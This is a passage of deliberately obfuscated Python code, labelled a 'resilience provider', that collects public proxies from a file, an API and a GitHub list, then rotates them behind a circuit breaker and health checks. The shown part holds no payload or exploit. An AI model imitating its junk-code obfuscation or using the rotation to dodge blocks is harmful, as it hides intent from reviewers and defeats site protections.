                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2] ^ 152 == 491:
                    IIlIlIIlllIIlllIIIIl = 9708513
                    while True:
                        if IIlIlIIlllIIlllIIIIl == 9708513:
                            IllIlIllIIIIllIllIlIIIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][0] * 902647 + 103
                            IIlIlIIlllIIlllIIIIl = 5419245
                            continue
                        if IIlIlIIlllIIlllIIIIl == 5419245:
                            IIIlIllllIIlllIlIllI = (IllIlIllIIIIllIllIlIIIII * 9 ^ 8859668) & 4294967295
                            IIlIlIIlllIIlllIIIIl = 9201317
                            continue
                        if IIlIlIIlllIIlllIIIIl == 6861461:
                            IIlIlIIlllIIlllIIIIl = 5419245
                            continue
                        if IIlIlIIlllIIlllIIIIl == 9201317:
                            llIIIlllIlIllIllIlI = [IIIlIllllIIlllIlIllI >> 2 & 255 for llIlIIlllllIIllIl in range(9)]
                            IIlIlIIlllIIlllIIIIl = 3214618
                            continue
                        if IIlIlIIlllIIlllIIIIl == 3214618:
                            IIlIllIIIIllIIllIl = sum(llIIIlllIlIllIllIlI) + IIIlIllllIIlllIlIllI % 38 - IllIlIllIIIIllIllIlIIIII
                            break
                llIlllIlIlIIllllll = 1088593
                continue
            if llIlllIlIlIIllllll == 3557952:
                llIlllIlIlIIllllll = 3557952
                continue

class IlllIIlIlIIllll:

    def __init__(self, config):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15] == 24:
            lIlIlIIlIllIlIlIl = 1762417
            while True:
                if lIlIlIIlIllIlIlIl == 1762417:
                    llllIIlIlIlIll = 91911168 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][31]
                    lIlIlIIlIllIlIlIl = 7397386
                    continue
                if lIlIlIIlIllIlIlIl == 7218730:
                    lIlIlIIlIllIlIlIl = 9663202
                    continue
                if lIlIlIIlIllIlIlIl == 9663202:
                    llIlIIlIlIIIIIl = [lIIlIIllllIIIllllIllI >> 10 & 255 for IIllIIlIIllIllIIIIllIIll in range(3)]
                    lIlIlIIlIllIlIlIl = 4763992
                    continue
                if lIlIlIIlIllIlIlIl == 4763992:
                    IIlIlIlllIIIlIlllIll = sum(llIlIIlIlIIIIIl) + lIIlIIllllIIIllllIllI % 8 - llllIIlIlIlIll
                    break
                if lIlIlIIlIllIlIlIl == 7397386:
                    lIIlIIllllIIIllllIllI = (llllIIlIlIlIll * 3 ^ 6583609) & 4294967295
                    lIlIlIIlIllIlIlIl = 9663202
                    continue
        setattr(self, 'config', config)

    def load_static_proxies(self):
        IlIllIlIllIIllllII = 3222275
        while True:
            if IlIllIlIllIIllllII == 2838132:
                if llIlIlllllIlllllIlI and getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(llIlIlllllIlllllIlI):
                    try:
                        with open(llIlIlllllIlllllIlI, 'r', encoding='utf-8') as f:
                            for line in f:
                                line = getattr(line, 'strip')()
                                if not line or getattr(line, 'startswith')(('#', '//')):
                                    continue
                                url = line if '://' in line else f'http://{line}'
                                try:
                                    p = getattr(getattr(urllib, 'parse'), 'urlparse')(url)
                                    if getattr(p, 'scheme') in ('http', 'https') and getattr(p, 'netloc'):
                                        getattr(proxies, 'append')(url)
                                except Exception:
                                    continue
                    except Exception as e:
                        print(f'[RESILIENCE PROVIDER] Error loading static proxies: {e}')
                IlIllIlIllIIllllII = 7989127
                continue
            if IlIllIlIllIIllllII == 3222275:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][8] * 49 + 83 == 8586:
                    lIllIIIIllIlllIIl = 3358949
                    while True:
                        if lIllIIIIllIlllIIl == 3544770:
                            IIlIllIIlIlIlIlI = (lIIIllllIIllllIIIl * 6 ^ 3678812) & 65535
                            lIllIIIIllIlllIIl = 9507281
                            continue
                        if lIllIIIIllIlllIIl == 3358949:
                            lIIIllllIIllllIIIl = 65777201
                            lIllIIIIllIlllIIl = 3544770
                            continue
                        if lIllIIIIllIlllIIl == 3890583:
                            IlIIllllIlIIII = sum(IIIIIIllIllllIIIlllI) + IIlIllIIlIlIlIlI % 95 - lIIIllllIIllllIIIl
                            break
                        if lIllIIIIllIlllIIl == 1554176:
                            lIllIIIIllIlllIIl = 4457910
                            continue
                        if lIllIIIIllIlllIIl == 9507281:
                            IIIIIIllIllllIIIlllI = [IIlIllIIlIlIlIlI >> 1 & 255 for IIIIIllIIlllIllIIlII in range(6)]
                            lIllIIIIllIlllIIl = 3890583
                            continue
                        if lIllIIIIllIlllIIl == 4457910:
                            lIllIIIIllIlllIIl = 3544770
                            continue
                IlIllIlIllIIllllII = 7614841
                continue
            if IlIllIlIllIIllllII == 9155618:
                llIlIlllllIlllllIlI = getattr(getattr(self, 'config'), 'get')('static_file')
                IlIllIlIllIIllllII = 2838132
                continue
            if IlIllIlIllIIllllII == 1578055:
                IlIllIlIllIIllllII = 1578055
                continue
            if IlIllIlIllIIllllII == 7614841:
                proxies = []
                IlIllIlIllIIllllII = 9155618
                continue
            if IlIllIlIllIIllllII == 7989127:
                return proxies
                break

    def fetch_api_proxies(self):
        lIlIllIIlllIIlIlllIllIll = 9769242
        while True:
            if lIlIllIIlllIIlIlllIllIll == 1871265:
                try:
                    lllllIIIIllIllllIIl = 9394921
                    while True:
                        if lllllIIIIllIllllIIl == 3670146:
                            IlllIIllIIlIIIIllII = getattr(requests, 'get')(url, timeout=10)
                            lllllIIIIllIllllIIl = 4051855
                            continue
                        if lllllIIIIllIllllIIl == 4498795:
                            lllllIIIIllIllllIIl = 4051855
                            continue
                        if lllllIIIIllIllllIIl == 4051855:
                            if getattr(IlllIIllIIlIIIIllII, 'status_code') == 200:
                                IIIIlIlIIIIIIIIlIIll = 3299018
                                while True:
                                    if IIIIlIlIIIIIIIIlIIll == 3299018:
                                        proxies = []
                                        IIIIlIlIIIIIIIIlIIll = 9103530
                                        continue
                                    if IIIIlIlIIIIIIIIlIIll == 9103530:
                                        for l in getattr(getattr(IlllIIllIIlIIIIllII, 'text'), 'splitlines')():
                                            line = getattr(l, 'strip')()
                                            if line:
                                                lIIIlllIlIlIIIllllIllI = f'http://{line}' if '://' not in line else line
                                                getattr(proxies, 'append')(lIIIlllIlIlIIIllllIllI)
                                        IIIIlIlIIIIIIIIlIIll = 7418945
                                        continue
                                    if IIIIlIlIIIIIIIIlIIll == 6080504:
                                        IIIIlIlIIIIIIIIlIIll = 7334292
                                        continue
                                    if IIIIlIlIIIIIIIIlIIll == 7418945:
                                        return proxies
                                        break
                                    if IIIIlIlIIIIIIIIlIIll == 7334292:
                                        IIIIlIlIIIIIIIIlIIll = 6080504
                                        continue
                            break
                        if lllllIIIIllIllllIIl == 4695993:
                            url = f'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&key={api_key}'
                            lllllIIIIllIllllIIl = 3670146
                            continue
                        if lllllIIIIllIllllIIl == 9394921:
                            api_key = getattr(self, 'config')['api_key']
                            lllllIIIIllIllllIIl = 4695993
                            continue
                except Exception as e:
                    print(f'[RESILIENCE PROVIDER] API Error: {e}')
                lIlIllIIlllIIlIlllIllIll = 4274272
                continue
            if lIlIllIIlllIIlIlllIllIll == 9501981:
                if not getattr(getattr(self, 'config'), 'get')('api_enabled') or not getattr(getattr(self, 'config'), 'get')('api_key'):
                    return []
                lIlIllIIlllIIlIlllIllIll = 1871265
                continue
            if lIlIllIIlllIIlIlllIllIll == 9769242:
                if 10281 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] == 10395:
                    IlIlIllIIIIIllIIIIIlIlI = 3781611
                    while True:
                        if IlIlIllIIIIIllIIIIIlIlI == 1140902:
                            llllIllIIIIllIIlIl = [IIIIllIIlllIlIlIlIIIlI >> 7 & 255 for IllIIlIllIllll in range(2)]
                            IlIlIllIIIIIllIIIIIlIlI = 1598971
                            continue
                        if IlIlIllIIIIIllIIIIIlIlI == 4148528:
                            IlIlIllIIIIIllIIIIIlIlI = 1140902
                            continue
                        if IlIlIllIIIIIllIIIIIlIlI == 1598971:
                            lIlllIlllIIIIlIlIlII = sum(llllIllIIIIllIIlIl) + IIIIllIIlllIlIlIlIIIlI % 28 - IlIllIIllllIlIlllIII
                            break
                        if IlIlIllIIIIIllIIIIIlIlI == 9884575:
                            IlIlIllIIIIIllIIIIIlIlI = 5331279
                            continue
                        if IlIlIllIIIIIllIIIIIlIlI == 3781611:
                            IlIllIIllllIlIlllIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] * 235333 + 162
                            IlIlIllIIIIIllIIIIIlIlI = 1804991
                            continue
                        if IlIlIllIIIIIllIIIIIlIlI == 1804991:
                            IIIIllIIlllIlIlIlIIIlI = (IlIllIIllllIlIlllIII * 2 ^ 10158199) & 16777215
                            IlIlIllIIIIIllIIIIIlIlI = 1140902
                            continue
                        if IlIlIllIIIIIllIIIIIlIlI == 5331279:
                            IlIlIllIIIIIllIIIIIlIlI = 9884575
                            continue
                lIlIllIIlllIIlIlllIllIll = 9501981
                continue
            if lIlIllIIlllIIlIlllIllIll == 4126921:
                lIlIllIIlllIIlIlllIllIll = 9501981
                continue
            if lIlIllIIlllIIlIlllIllIll == 4274272:
                return []
                break

    def fetch_github_proxies(self):
        IllllIIllllIlIll = 7205596
        while True:
            if IllllIIllllIlIll == 2851252:
                IllllIIllllIlIll = 2851252
                continue
            if IllllIIllllIlIll == 7205596:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2] == 99:
                    IIlIllIlIIlIIIlll = 3608265
                    while True:
                        if IIlIllIlIIlIIIlll == 8725685:
                            IIlIllIlIIlIIIlll = 3608265
                            continue
                        if IIlIllIlIIlIIIlll == 1023032:
                            IIIllIIIIlIlIlllIIlI = [IIllIlllIIIIlI >> 3 & 255 for IllIlIIllIIIlIlIIIIllII in range(9)]
                            IIlIllIlIIlIIIlll = 8366565
                            continue
                        if IIlIllIlIIlIIIlll == 4305020:
                            IIlIllIlIIlIIIlll = 3608265
                            continue
                        if IIlIllIlIIlIIIlll == 3535183:
                            IIlIllIlIIlIIIlll = 8725685
                            continue
                        if IIlIllIlIIlIIIlll == 8366565:
                            lIlIIIIIllIIIIIllIl = sum(IIIllIIIIlIlIlllIIlI) + IIllIlllIIIIlI % 27 - IIlIIlIlIlllllllll
                            break
                        if IIlIllIlIIlIIIlll == 1260532:
                            IIllIlllIIIIlI = (IIlIIlIlIlllllllll * 9 ^ 14683660) & 65535
                            IIlIllIlIIlIIIlll = 1023032
                            continue
                        if IIlIllIlIIlIIIlll == 3608265:
                            IIlIIlIlIlllllllll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][9] * 815725 + 83
                            IIlIllIlIIlIIIlll = 1260532
                            continue
                IllllIIllllIlIll = 3175187
                continue
            if IllllIIllllIlIll == 3175187:
                IllIlIIlIllIllIlIII = 'https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt'
                IllllIIllllIlIll = 9436070
                continue
            if IllllIIllllIlIll == 9436070:
                try:
                    lIIIlllllIlIllllllIl = getattr(requests, 'get')(IllIlIIlIllIllIlIII, timeout=10)
                    if getattr(lIIIlllllIlIllllllIl, 'status_code') == 200:
                        IIIIlIlIllIIlIlllIlIIl = 4202256
                        while True:
                            if IIIIlIlIllIIlIlllIlIIl == 9795117:
                                for l in getattr(getattr(lIIIlllllIlIllllllIl, 'text'), 'splitlines')():
                                    line = getattr(l, 'strip')()
                                    if line:
                                        llIlIIIlllllIIllIlIl = f'http://{line}' if '://' not in line else line
                                        getattr(proxies, 'append')(llIlIIIlllllIIllIlIl)
                                IIIIlIlIllIIlIlllIlIIl = 9723606
                                continue
                            if IIIIlIlIllIIlIlllIlIIl == 7517688:
                                IIIIlIlIllIIlIlllIlIIl = 9795117
                                continue
                            if IIIIlIlIllIIlIlllIlIIl == 9723606:
                                return proxies
                                break
                            if IIIIlIlIllIIlIlllIlIIl == 8976019:
                                IIIIlIlIllIIlIlllIlIIl = 8150556
                                continue
                            if IIIIlIlIllIIlIlllIlIIl == 4202256:
                                proxies = []
                                IIIIlIlIllIIlIlllIlIIl = 9795117
                                continue
                            if IIIIlIlIllIIlIlllIlIIl == 8150556:
                                IIIIlIlIllIIlIlllIlIIl = 8976019
                                continue
                except Exception as e:
                    print(f'[RESILIENCE PROVIDER] GitHub Source Error: {e}')
                IllllIIllllIlIll = 7344614
                continue
            if IllllIIllllIlIll == 7344614:
                return []
                break

    def get_all_candidates(self):
        IlIIlllIIlIlIIIIll = 9619863
        while True:
            if IlIIlllIIlIlIIIIll == 4647341:
                return list(getattr(lIllIIIlllIIIlllI, 'values')())
                break
            if IlIIlllIIlIlIIIIll == 3785018:
                IIIIlIllllIlIIIIIIIl = getattr(self, 'fetch_github_proxies')()
                IlIIlllIIlIlIIIIll = 4547361
                continue
            if IlIIlllIIlIlIIIIll == 8740687:
                lIllIIIlllIIIlllI = {}
                IlIIlllIIlIlIIIIll = 6719944
                continue
            if IlIIlllIIlIlIIIIll == 4151240:
                static = getattr(self, 'load_static_proxies')()
                IlIIlllIIlIlIIIIll = 8754155
                continue
            if IlIIlllIIlIlIIIIll == 6719944:
                for p in raw:
                    try:
                        IIllllIIlllIllIlIlllIII = getattr(getattr(urllib, 'parse'), 'urlparse')(p)
                        if getattr(IIllllIIlllIllIlIlllIII, 'scheme') in ('http', 'https') and getattr(IIllllIIlllIllIlIlllIII, 'netloc'):
                            llllIIlIIlIllIlIIlIlIIll = f'{getattr(IIllllIIlllIllIlIlllIII, 'scheme')}://{getattr(IIllllIIlllIllIlIlllIII, 'netloc')}'
                            lIllIIIlllIIIlllI[llllIIlIIlIllIlIIlIlIIll] = llllIIlIIlIllIlIIlIlIIll
                    except Exception:
                        continue
                IlIIlllIIlIlIIIIll = 4647341
                continue
            if IlIIlllIIlIlIIIIll == 4547361:
                raw = static + api + IIIIlIllllIlIIIIIIIl
                IlIIlllIIlIlIIIIll = 8740687
                continue
            if IlIIlllIIlIlIIIIll == 5903833:
                IlIIlllIIlIlIIIIll = 8754155
                continue
            if IlIIlllIIlIlIIIIll == 9619863:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][12] ^ 100 == 435:
                    IlIlIIIIllIlIllllIl = 7742109
                    while True:
                        if IlIlIIIIllIlIllllIl == 3322999:
                            IlIlIIIIllIlIllllIl = 7742109
                            continue
                        if IlIlIIIIllIlIllllIl == 5764971:
                            IlIlIIIIllIlIllllIl = 3322999
                            continue
                        if IlIlIIIIllIlIllllIl == 7742109:
                            IlllIIlIlllIIIIll = 89076096 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][14]
                            IlIlIIIIllIlIllllIl = 1481692
                            continue
                        if IlIlIIIIllIlIllllIl == 2069945:
                            IlIlllllIlIllIIIllII = [IIlIIlllIlllIIlIlIlII >> 11 & 255 for IIlIIlIIlllIIllIIIIl in range(3)]
                            IlIlIIIIllIlIllllIl = 5067848
                            continue
                        if IlIlIIIIllIlIllllIl == 4564976:
                            IlIlIIIIllIlIllllIl = 3322999
                            continue
                        if IlIlIIIIllIlIllllIl == 5067848:
                            IIllIIlIllIIIII = sum(IlIlllllIlIllIIIllII) + IIlIIlllIlllIIlIlIlII % 49 - IlllIIlIlllIIIIll
                            break
                        if IlIlIIIIllIlIllllIl == 1481692:
                            IIlIIlllIlllIIlIlIlII = (IlllIIlIlllIIIIll * 3 ^ 13432791) & 65535
                            IlIlIIIIllIlIllllIl = 2069945
                            continue
                IlIIlllIIlIlIIIIll = 4151240
                continue
            if IlIIlllIIlIlIIIIll == 8754155:
                api = getattr(self, 'fetch_api_proxies')()
                IlIIlllIIlIlIIIIll = 3785018
                continue

class IllllllIIlIlllIlIlIII:
    CLOSED = 'CLOSED'
    OPEN = 'OPEN'
    HALF_OPEN = 'HALF_OPEN'

    def __init__(self, failure_threshold=3, cooldown_duration=30.0):
        lIIIIlIlllIllIIlI = 7733302
        while True:
            if lIIIIlIlllIllIIlI == 9785845:
                setattr(self, 'opened_at', 0.0)
                break
            if lIIIIlIlllIllIIlI == 1428892:
                setattr(self, 'state', getattr(IllllllIIlIlllIlIlIII, 'CLOSED'))
                lIIIIlIlllIllIIlI = 7047481
                continue
            if lIIIIlIlllIllIIlI == 8530146:
                setattr(self, 'failure_threshold', failure_threshold)
                lIIIIlIlllIllIIlI = 2723725
                continue
            if lIIIIlIlllIllIIlI == 7047481:
                setattr(self, 'consecutive_failures', 0)
                lIIIIlIlllIllIIlI = 9785845
                continue
            if lIIIIlIlllIllIIlI == 5586291:
                lIIIIlIlllIllIIlI = 5586291
                continue
            if lIIIIlIlllIllIIlI == 2723725:
                setattr(self, 'cooldown_duration', cooldown_duration)
                lIIIIlIlllIllIIlI = 1428892
                continue
            if lIIIIlIlllIllIIlI == 7733302:
                lIIIIlIlllIllIIlI = 8530146
                continue

    def record_success(self):
        llllIIllIllIllIIIIIIl = 5612072
        while True:
            if llllIIllIllIllIIIIIIl == 2036451:
                setattr(self, 'consecutive_failures', 0)
                llllIIllIllIllIIIIIIl = 1753102
                continue
            if llllIIllIllIllIIIIIIl == 1753102:
                setattr(self, 'state', getattr(IllllllIIlIlllIlIlIII, 'CLOSED'))
                break
            if llllIIllIllIllIIIIIIl == 5612072:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][13] ^ 77 == 510:
                    lllIIIlllIlllII = 4777360
                    while True:
                        if lllIIIlllIlllII == 9834622:
                            lllIIIlllIlllII = 4777360
                            continue
                        if lllIIIlllIlllII == 7679422:
                            IllIlIIlllIlIl = sum(IIlllIllIlIlII) + lIIIlIIllIlIIllIlIII % 23 - lIIIllllIllIII
                            break
                        if lllIIIlllIlllII == 6032796:
                            lIIIlIIllIlIIllIlIII = (lIIIllllIllIII * 6 ^ 13931029) & 16777215
                            lllIIIlllIlllII = 2408901
                            continue
                        if lllIIIlllIlllII == 2408901:
                            IIlllIllIlIlII = [lIIIlIIllIlIIllIlIII >> 6 & 255 for llIlIllIIlIlIllIIIlIIl in range(6)]
                            lllIIIlllIlllII = 7679422
                            continue
                        if lllIIIlllIlllII == 4777360:
                            lIIIllllIllIII = 22780532
                            lllIIIlllIlllII = 6032796
                            continue
                llllIIllIllIllIIIIIIl = 2036451
                continue
            if llllIIllIllIllIIIIIIl == 8262164:
                llllIIllIllIllIIIIIIl = 6699274
                continue
            if llllIIllIllIllIIIIIIl == 2955360:
                llllIIllIllIllIIIIIIl = 2955360
                continue
            if llllIIllIllIllIIIIIIl == 6699274:
                llllIIllIllIllIIIIIIl = 8262164
                continue

    def record_failure(self):
        lllIllIlIllIIll = 2343981
        while True:
            if lllIllIlIllIIll == 7971508:
                lllIllIlIllIIll = 5594532
                continue
            if lllIllIlIllIIll == 9550518:
                if getattr(self, 'consecutive_failures') >= getattr(self, 'failure_threshold'):
                    setattr(self, 'state', getattr(IllllllIIlIlllIlIlIII, 'OPEN'))
                    setattr(self, 'opened_at', getattr(IlllllIIllIIllIIll, 'time')())
                break
            if lllIllIlIllIIll == 9018435:
                self.consecutive_failures += 1
                lllIllIlIllIIll = 9550518
                continue
            if lllIllIlIllIIll == 5594532:
                lllIllIlIllIIll = 9018435
                continue
            if lllIllIlIllIIll == 1433814:
                lllIllIlIllIIll = 9018435
                continue
            if lllIllIlIllIIll == 2343981:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][30] ^ 245 == 521:
                    IIllIIllIIIllIlIIIIII = 1503918
                    while True:
                        if IIllIIllIIIllIlIIIIII == 7881301:
                            IIllIIllIIIllIlIIIIII = 9739698
                            continue
                        if IIllIIllIIIllIlIIIIII == 9739698:
                            llIIlIllIIIIIlIIIIIlII = [lllIlllllIlIlllIllIlIlIl >> 12 & 255 for IIIllIIlIIIlIlIlIIllIIl in range(5)]
                            IIllIIllIIIllIlIIIIII = 9576498
                            continue
                        if IIllIIllIIIllIlIIIIII == 9399972:
                            IIllIIllIIIllIlIIIIII = 9739698
                            continue
                        if IIllIIllIIIllIlIIIIII == 8583823:
                            lllIlllllIlIlllIllIlIlIl = (IIIllIllIIlIlIllIIIl * 5 ^ 15958317) & 16777215
                            IIllIIllIIIllIlIIIIII = 9739698
                            continue
                        if IIllIIllIIIllIlIIIIII == 1503918:
                            IIIllIllIIlIlIllIIIl = 3727479 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][0]
                            IIllIIllIIIllIlIIIIII = 8583823
                            continue
                        if IIllIIllIIIllIlIIIIII == 8266397:
                            IIllIIllIIIllIlIIIIII = 9576498
                            continue
                        if IIllIIllIIIllIlIIIIII == 9576498:
                            IIIllIlllIIIlIlll = sum(llIIlIllIIIIIlIIIIIlII) + lllIlllllIlIlllIllIlIlIl % 81 - IIIllIllIIlIlIllIIIl
                            break
                lllIllIlIllIIll = 9018435
                continue

    def can_attempt(self):
        lIlIlIIllIIIll = 7040246
        while True:
            if lIlIlIIllIIIll == 7040246:
                if 2440 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][0] == 2654:
                    lIIlIIllIllIIll = 9304055
                    while True:
                        if lIIlIIllIllIIll == 3163446:
                            lIIlIIllIllIIll = 3392964
                            continue
                        if lIIlIIllIllIIll == 5967015:
                            lIIlIIllIllIIll = 3392964
                            continue
                        if lIIlIIllIllIIll == 8207787:
                            lIlIIIlIlIllIl = [lllIlIIIIIIlIIlI >> 7 & 255 for IllIllllllIIllIIllI in range(6)]
                            lIIlIIllIllIIll = 9378230
                            continue
                        if lIIlIIllIllIIll == 4403621:
                            lllIlIIIIIIlIIlI = (llllIIIIllIlIlllIllll * 6 ^ 4522083) & 4294967295
                            lIIlIIllIllIIll = 8207787
                            continue
                        if lIIlIIllIllIIll == 9378230:
                            lIlIllIllllIlll = sum(lIlIIIlIlIllIl) + lllIlIIIIIIlIIlI % 31 - llllIIIIllIlIlllIllll
                            break
                        if lIIlIIllIllIIll == 3392964:
                            lIIlIIllIllIIll = 9304055
                            continue
                        if lIIlIIllIllIIll == 9304055:
                            llllIIIIllIlIlllIllll = 14922885
                            lIIlIIllIllIIll = 4403621
                            continue
                lIlIlIIllIIIll = 5771379
                continue
            if lIlIlIIllIIIll == 5771379:
                if getattr(self, 'state') == getattr(IllllllIIlIlllIlIlIII, 'CLOSED'):
                    return True
                lIlIlIIllIIIll = 2337760
                continue
            if lIlIlIIllIIIll == 6736547:
                return False
                break
            if lIlIlIIllIIIll == 2337760:
                if getattr(self, 'state') == getattr(IllllllIIlIlllIlIlIII, 'OPEN'):
                    if getattr(IlllllIIllIIllIIll, 'time')() - getattr(self, 'opened_at') >= getattr(self, 'cooldown_duration'):
                        setattr(self, 'state', getattr(IllllllIIlIlllIlIlIII, 'HALF_OPEN'))
                        return True
                    return False
                lIlIlIIllIIIll = 2079108
                continue
            if lIlIlIIllIIIll == 9314819:
                lIlIlIIllIIIll = 6736547
                continue
            if lIlIlIIllIIIll == 2079108:
                if getattr(self, 'state') == getattr(IllllllIIlIlllIlIlIII, 'HALF_OPEN'):
                    return True
                lIlIlIIllIIIll = 6736547
                continue

class IlIIlllIllIIlllIIlll:

    def __init__(self, provider, config):
        IlIlIlllIIllIllI = 3481776
        while True:
            if IlIlIlllIIllIllI == 7613545:
                setattr(self, 'lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                IlIlIlllIIllIllI = 1578832
                continue
            if IlIlIlllIIllIllI == 8275678:
                setattr(self, 'config', config)
                IlIlIlllIIllIllI = 7613545
                continue
            if IlIlIlllIIllIllI == 2650239:
                setattr(self, 'provider', provider)
                IlIlIlllIIllIllI = 8275678
                continue
            if IlIlIlllIIllIllI == 3270679:
                setattr(self, 'last_refresh', 0.0)
                IlIlIlllIIllIllI = 9193378
                continue
            if IlIlIlllIIllIllI == 1578832:
                setattr(self, 'pool', {})
                IlIlIlllIIllIllI = 5642869
                continue
            if IlIlIlllIIllIllI == 9193378:
                setattr(self, 'refreshing', False)
                break
            if IlIlIlllIIllIllI == 3481776:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][16] ^ 5 == 406:
                    IIlIIlIIIlllIl = 4887302
                    while True:
                        if IIlIIlIIIlllIl == 3076964:
                            IIlIIlIIIlllIl = 1066641
                            continue
                        if IIlIIlIIIlllIl == 8842760:
                            IIlIIlIIIlllIl = 8842760
                            continue
                        if IIlIIlIIIlllIl == 1066641:
                            IIIIlIlIIIIlllIllI = sum(lllIlIlllIlIll) + IlIIllllIIllIllII % 4 - IllllIIIIIIlllIl
                            break
                        if IIlIIlIIIlllIl == 4694818:
                            IIlIIlIIIlllIl = 8842760
                            continue
                        if IIlIIlIIIlllIl == 9606393:
                            IlIIllllIIllIllII = (IllllIIIIIIlllIl * 3 ^ 4156462) & 65535
                            IIlIIlIIIlllIl = 3177194
                            continue
                        if IIlIIlIIIlllIl == 3177194:
                            lllIlIlllIlIll = [IlIIllllIIllIllII >> 7 & 255 for lllllIIlIlIIII in range(3)]
                            IIlIIlIIIlllIl = 1066641
                            continue
                        if IIlIIlIIIlllIl == 4887302:
                            IllllIIIIIIlllIl = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15] * 273288 + 170
                            IIlIIlIIIlllIl = 9606393
                            continue
                IlIlIlllIIllIllI = 2650239
                continue
            if IlIlIlllIIllIllI == 5642869:
                setattr(self, 'concurrency', {})
                IlIlIlllIIllIllI = 2232396
                continue
            if IlIlIlllIIllIllI == 4001407:
                IlIlIlllIIllIllI = 2650239
                continue
            if IlIlIlllIIllIllI == 2232396:
                setattr(self, 'max_concurrency_per_proxy', 5)
                IlIlIlllIIllIllI = 3270679
                continue

    def check_proxy_health(self, url):
        llllllllIlllIll = 4101675
        while True:
            if llllllllIlllIll == 5668376:
                lIllllIlIllIIIlII = getattr(IlllllIIllIIllIIll, 'time')()
                llllllllIlllIll = 8506471
                continue
            if llllllllIlllIll == 9099180:
                proxies = {'http': url, 'https': url}
                llllllllIlllIll = 5668376
                continue
            if llllllllIlllIll == 6740749:
                timeout = getattr(getattr(self, 'config'), 'get')('healthcheck_timeout', 5)
                llllllllIlllIll = 7083944
                continue
            if llllllllIlllIll == 9920324:
                llllllllIlllIll = 8506471
                continue
            if llllllllIlllIll == 8506471:
                try:
                    IIlIIIllllllIIIlI = 4809612
                    while True:
                        if IIlIIIllllllIIIlI == 5662965:
                            IIlIIIllllllIIIlI = 4809612
                            continue
                        if IIlIIIllllllIIIlI == 9378975:
                            llIlIIllIllIIIlIlIll = (getattr(IlllllIIllIIllIIll, 'time')() - lIllllIlIllIIIlII) * 1000
                            IIlIIIllllllIIIlI = 5108887
                            continue
                        if IIlIIIllllllIIIlI == 5108887:
                            if getattr(lllIlIlIIIllIlllIll, 'status_code') == 200:
                                IlIlIIlIlIIlIll = 1222328
                                while True:
                                    if IlIlIIlIlIIlIll == 1648439:
                                        return ('HTTP_ERROR', False, llIlIIllIllIIIlIlIll)
                                        break
                                    if IlIlIIlIlIIlIll == 5545610:
                                        IlIlIIlIlIIlIll = 1222328
                                        continue
                                    if IlIlIIlIlIIlIll == 1222328:
                                        IIlIIllIIlIIllllllIlII = getattr(getattr(lllIlIlIIIllIlllIll, 'text'), 'strip')()
                                        IlIlIIlIlIIlIll = 1905191
                                        continue
                                    if IlIlIIlIlIIlIll == 1905191:
                                        if len(IIlIIllIIlIIllllllIlII) > 0:
                                            return ('HEALTHY', True, llIlIIllIllIIIlIlIll)
                                        IlIlIIlIlIIlIll = 1648439
                                        continue
                            elif 400 <= getattr(lllIlIlIIIllIlllIll, 'status_code') < 500:
